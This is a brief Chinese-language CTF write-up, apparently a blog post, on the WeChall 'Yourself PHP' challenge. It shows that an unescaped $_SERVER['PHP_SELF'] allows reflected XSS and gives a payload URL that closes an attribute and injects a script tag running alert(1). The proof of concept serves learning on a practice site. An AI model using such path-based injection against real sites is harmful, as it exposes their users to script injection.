---
title: Yourself PHP
author: rk700
layout: post
categories:
  - writeup
tags:
  - PHP
  - wechall
  - XSS
---
<http://www.wechall.net/challenge/yourself_php/index.php/asdf>  
因为`username`被转义了，不能在这注入

但是`_$SERVER['PHP_SELF']`被直接输出，而且这道题的标题就暗示了要从这里入手  
<pre>http://www.wechall.net/challenge/yourself_php/index.php/&#x22;&#x3E;&#x3C;script&#x3E;alert(1);&#x3C;/script&#x3E;</pre>

但有个地方还是不太明白，`/foo.php/bar`被解析成`/foo.php`，是PHP的决定还是web server的？